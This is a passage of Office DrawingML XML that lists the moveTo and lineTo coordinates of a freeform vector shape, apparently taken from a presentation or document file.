                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1544370" y="126669"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1540535" y="146164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1541310" y="208064"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1540357" y="259384"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1536738" y="347840"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1535887" y="393712"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1536852" y="446532"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1540535" y="510654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1557769" y="551649"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1595399" y="565391"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1617256" y="557580"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1634540" y="546176"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1645970" y="530694"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1650263" y="510654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1644230" y="445566"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1643392" y="391680"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1645831" y="344881"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1649641" y="301040"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1652917" y="256057"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1653768" y="205803"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="3197225" h="2564765">
                <a:moveTo>
                  <a:pt x="3197123" y="2132800"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3182620" y="2081999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3175419" y="2031199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3171037" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3168675" y="1929599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3167545" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3166846" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3165779" y="1751799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3163557" y="1688299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3159391" y="1637499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3152470" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3142005" y="1561299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3133433" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3128314" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3125914" y="1459699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3125444" y="1408899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3126181" y="1358099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3127337" y="1307299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3128162" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3127921" y="1192999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3125825" y="1129499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3121152" y="1078699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3113113" y="1027899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3100971" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3083966" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3054604" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3033687" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2984030" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2969895" y="862799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2956331" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2944418" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2942983" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2942259" y="786599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2944241" y="748499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2944711" y="710399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2938043" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2885490" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2858960" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2829369" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2796908" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2761742" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2724023" y="2005799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2683929" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2641612" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2551023" y="2043899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2503055" y="2056599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2402649" y="2081999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2350541" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2188527" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2133181" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2077453" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1744103" y="2336000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1690268" y="2374100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1701380" y="2361400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1745869" y="2310600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1802955" y="2272500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1861172" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1920201" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2098662" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2215388" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2272068" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2327160" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2380335" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2431237" y="1929599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2479548" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2524912" y="1904199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2567000" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2605468" y="1878799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2639974" y="1878799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2670175" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2695727" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2716301" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2795447" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2813964" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2807068" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2803055" y="1764499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2801061" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2800210" y="1662899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2800096" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799981" y="1637499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799880" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799765" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799651" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2798534" y="1548599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2795981" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2791142" y="1446999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2783154" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2771165" y="1358099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2760624" y="1319999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2754338" y="1269199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751302" y="1218399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750489" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750655" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750731" y="1142199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750820" y="1129499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750896" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751531" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751417" y="1027899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751378" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2749435" y="964399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2744686" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2736138" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2722778" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799359" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2814536" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2825699" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2833484" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2838488" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2841371" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2842717" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2843187" y="1104099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2843403" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2843961" y="1205699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2845524" y="1256499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2848686" y="1307299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2854096" y="1370799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2860789" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2866301" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2870911" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2874886" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2882112" y="1675599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2885910" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2890202" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2895257" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2901378" y="1878799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2711856" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2702598" y="608799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2702077" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701569" y="557999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701442" y="545299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701328" y="532599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701213" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701099" y="507199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2693568" y="469099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2682138" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2631236" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2573972" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2542603" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2509393" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2437511" y="1764499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2398839" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2358352" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2316061" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2271953" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2226043" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2178329" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2128812" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2077504" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2024392" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1969503" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1912823" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1854352" y="2056599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1794116" y="2094699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1732089" y="2132800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663179" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663255" y="2132800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663331" y="2120100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663407" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663484" y="2094699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1667230" y="2056599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1672437" y="2005799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1677123" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1679308" y="1904199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1677022" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660448" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1658289" y="1662899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660220" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1664639" y="1561299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1669961" y="1523199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1674583" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1676908" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1675345" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="1345399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660321" y="1294599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1658391" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660639" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1665147" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1670050" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1673466" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1673504" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1706714" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1745361" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1784311" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1810524" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1823631" y="786599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1863382" y="761199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1903641" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1944471" y="697699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1985949" y="684999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2028126" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2071090" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2114893" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2205317" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2252078" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2299957" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2558567" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2574391" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2584475" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2589949" y="684999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591955" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591879" y="735799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591803" y="748499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591727" y="761199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591651" y="773899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2590152" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588615" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588514" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588399" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588298" y="913599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588183" y="926299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2590000" y="989799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2595194" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2604922" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2614498" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2621013" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2625090" y="1294599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2627363" y="1345399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2628481" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2629065" y="1446999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2629751" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2631186" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2634005" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2638844" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2646337" y="1675599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2638831" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586342" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2386838" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2339238" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2292413" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2155964" y="494499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2111591" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2024138" y="545299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1895182" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1852523" y="634199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1767293" y="684999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1724609" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1595399" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="758164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530096" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527962" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1524965" y="1205699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522006" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519986" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519923" y="1294599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519809" y="1319999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522374" y="1370799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1525905" y="1408899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527327" y="1459699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527213" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1526082" y="1548599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1524482" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522971" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522082" y="1700999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522158" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522222" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522336" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1521320" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1520177" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519313" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519212" y="2043899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519123" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519999" y="2120100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522374" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2168842"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2361400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1324800" y="2247100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1266634" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1208862" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1180223" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1038974" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="983869" y="2081999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="929703" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="876592" y="2043899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="773976" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="676910" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="630732" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="586270" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="543648" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502958" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="427850" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="393661" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281838" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281000" y="1904199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="284162" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="290398" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298843" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308584" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318757" y="1688299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="328460" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="336791" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="342874" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="345821" y="1472399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344728" y="1408899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338721" y="1345399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333349" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="332803" y="1231099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="336207" y="1192999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="342658" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351269" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361162" y="1078699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="371436" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="381203" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="389572" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="395655" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="398564" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397408" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391312" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="467893" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="473494" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="473557" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="469226" y="951699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="461645" y="989799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451967" y="1027899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="441312" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="430847" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="421716" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415061" y="1192999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="412026" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="413753" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="429628" y="1383499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="431241" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="427621" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420166" y="1523199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="410260" y="1561299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399275" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="388607" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379628" y="1688299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="373722" y="1739099"/>
                </a:lnTo>
